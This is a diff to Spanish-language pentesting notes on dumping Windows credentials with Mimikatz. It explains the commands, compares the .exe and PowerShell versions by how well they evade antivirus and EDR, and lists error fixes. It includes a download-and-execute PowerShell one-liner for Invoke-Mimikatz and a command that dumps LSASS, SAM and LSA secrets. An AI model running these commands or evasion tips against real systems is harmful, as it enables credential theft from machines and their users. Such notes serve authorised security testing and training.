@@ -48,7 +48,35 @@ Características y detalles sobre el hash NTLM:
 5. Recomendación: Debido a las debilidades conocidas asociadas con NTLM, se recomienda deshabilitar su uso siempre que sea posible, en favor de protocolos de autenticación más seguros como Kerberos.
 ```
 
-## Extracción de credenciales con binario
+## Funciones 
+
+```bash 
+1. 'privilege::debug': Este comando en Mimikatz solicita privilegios de depuración para el proceso Mimikatz. Los privilegios de depuración son necesarios para acceder a ciertas áreas de la memoria del sistema operativo y realizar operaciones que normalmente están restringidas.
+    
+2. 'token::elevate': Este comando intenta elevar los privilegios de Mimikatz. En el contexto de Mimikatz, esto generalmente significa obtener un token de seguridad de un proceso con privilegios más altos, permitiendo que Mimikatz opere con esos privilegios elevados.
+    
+3. 'sekurlsa::logonpasswords': Este comando extrae las contraseñas y otros datos de autenticación de la memoria del sistema, específicamente desde la seguridad de Kerberos, SSP, msv1_0, entre otros. Utiliza el módulo sekurlsa de Mimikatz para acceder a la información almacenada por el proceso LSASS (Local Security Authority Subsystem Service).
+
+    
+4. 'lsadump::sam': Este comando extrae las credenciales almacenadas en la base de datos SAM (Security Accounts Manager). La SAM contiene las credenciales de todos los usuarios locales del sistema y se utiliza generalmente para obtener hashes de contraseñas de cuentas locales.
+
+    
+5. 'lsadump::secrets': Este comando se utiliza para extraer "secretos" almacenados por el sistema, como claves de acceso y otros datos sensibles, que pueden estar almacenados en el registro o en el servicio LSASS.
+```
+
+## Extracción de credenciales con binario .exe
+
+```bash 
+Pros
+- Funcionalidad Completa: La versión ejecutable suele tener todas las funciones de Mimikatz disponibles y está actualizada con las últimas características. 
+- Rapidez: Al ejecutar el binario directamente, se suele tener una ejecución más rápida y directa de las funciones deseadas.
+    
+
+Contras
+- Detección: Es más probable que los antivirus y las herramientas de seguridad modernas detecten la versión ejecutable debido a sus firmas conocidas. 
+- Necesidad de Escritura en el Disco: A menos que se cargue en la memoria de manera especial, es probable que requiera ser escrito en el disco para su ejecución, lo que aumenta el riesgo de detección y deja evidencia forense. 
+- Bloqueo por Políticas de Seguridad: Políticas de grupo y configuraciones de seguridad de Windows pueden impedir la ejecución de binarios desconocidos o no firmados.
+```
 
 * [Mimikatz](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/kali/master/x64?ref_type=heads)
 
@@ -82,6 +110,19 @@ Nota2:
 
 ## Extracción de credenciales con Powershell 
 
+```bash 
+Pros
+- Evasión: La versión de PowerShell puede ser más sigilosa, evadiendo mejor la detección de antivirus y soluciones EDR que buscan hashes de archivos conocidos.
+- Flexibilidad: Puede ser más fácil de ejecutar en memoria sin necesidad de escribir en el disco, lo cual es menos intrusivo y reduce la huella en el sistema de la víctima.
+- Integración: Se integra bien con otras herramientas y scripts de PowerShell, facilitando su uso en cadenas de ataque complejas.
+    
+
+Contras
+- Funcionalidad Limitada: Puede no tener todas las funciones que la versión completa .exe ofrece.
+- Logging de PowerShell: Las versiones más recientes de Windows tienen mejoras en el registro de actividades de PowerShell, lo que podría dejar rastros para los equipos de respuesta a incidentes.
+- Bloqueo de Scripts: Las políticas de ejecución de scripts y restricciones de firmas digitales pueden bloquear la ejecución de scripts PowerShell no firmados.
+```
+
 ```powershell 
 # Descargamos el binario del repositorio
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');
@@ -90,16 +131,14 @@ Nota2:
 ❯ Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
 ```
 
+## Errores en Mimikatz 
+
 ```bash 
-1. 'privilege::debug': Este comando en Mimikatz solicita privilegios de depuración para el proceso Mimikatz. Los privilegios de depuración son necesarios para acceder a ciertas áreas de la memoria del sistema operativo y realizar operaciones que normalmente están restringidas.
-    
-2. 'token::elevate': Este comando intenta elevar los privilegios de Mimikatz. En el contexto de Mimikatz, esto generalmente significa obtener un token de seguridad de un proceso con privilegios más altos, permitiendo que Mimikatz opere con esos privilegios elevados.
-    
-3. 'sekurlsa::logonpasswords': Este comando extrae las contraseñas y otros datos de autenticación de la memoria del sistema, específicamente desde la seguridad de Kerberos, SSP, msv1_0, entre otros. Utiliza el módulo sekurlsa de Mimikatz para acceder a la información almacenada por el proceso LSASS (Local Security Authority Subsystem Service).
+1. 'ERROR kuhl_m_sekurlsa_acquireLSA ; Key import'
+Para solucionar el error utilizar una version antigua de mimikatz:
 
-    
-4. 'lsadump::sam': Este comando extrae las credenciales almacenadas en la base de datos SAM (Security Accounts Manager). La SAM contiene las credenciales de todos los usuarios locales del sistema y se utiliza generalmente para obtener hashes de contraseñas de cuentas locales.
+    https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/x64
 
-    
-5. 'lsadump::secrets': Este comando se utiliza para extraer "secretos" almacenados por el sistema, como claves de acceso y otros datos sensibles, que pueden estar almacenados en el registro o en el servicio LSASS.
+2. 'ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege'
+Para solucionar el error se debe correr como administrador el proceso desde donde se ejecutara el binario.
 ```
